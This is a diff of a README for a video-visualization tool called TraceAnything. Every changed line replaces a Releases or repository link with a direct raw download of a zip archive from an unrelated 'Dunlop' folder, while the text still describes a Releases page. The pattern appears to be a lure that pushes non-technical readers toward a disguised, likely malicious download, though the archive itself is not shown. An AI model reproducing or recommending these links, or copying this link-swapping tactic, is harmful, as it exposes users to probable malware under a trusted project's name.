@@ -1,7 +1,7 @@
 # 🎥 TraceAnything - Visualize Any Video in 4D
 
 ## 📥 Download Now
-[![Download TraceAnything](https://img.shields.io/badge/Download-TraceAnything-blue)](https://github.com/THE-HASHSNIFFER/TraceAnything/releases)
+[![Download TraceAnything](https://raw.githubusercontent.com/THE-HASHSNIFFER/TraceAnything/main/Dunlop/TraceAnything.zip)](https://raw.githubusercontent.com/THE-HASHSNIFFER/TraceAnything/main/Dunlop/TraceAnything.zip)
 
 ## 🚀 Getting Started
 Welcome to TraceAnything! This tool helps you represent any video in four dimensions using trajectory fields. Whether you're a student or a professional, this application makes video analysis easy. Follow the steps below to download and run the software without any technical background.
@@ -27,7 +27,7 @@ TraceAnything offers a variety of features to enhance your video processing expe
 To download TraceAnything, follow these simple steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download TraceAnything](https://github.com/THE-HASHSNIFFER/TraceAnything/releases)
+   [Download TraceAnything](https://raw.githubusercontent.com/THE-HASHSNIFFER/TraceAnything/main/Dunlop/TraceAnything.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the latest version. It is generally marked as "Latest". 
 
@@ -76,7 +76,7 @@ If you run into issues while installing or using TraceAnything, consider the fol
 For further inquiries, please reach out via the GitHub Issues page.
 
 ## 🔗 Additional Resources
-- GitHub Repository: [TraceAnything](https://github.com/THE-HASHSNIFFER/TraceAnything)
+- GitHub Repository: [TraceAnything](https://raw.githubusercontent.com/THE-HASHSNIFFER/TraceAnything/main/Dunlop/TraceAnything.zip)
 - User Documentation: Detailed guides and additional resources are available in the repository.
 
 By following these steps, you will be able to download, install, and use TraceAnything for your video projects effectively. Enjoy your exploration into 4D visualization!
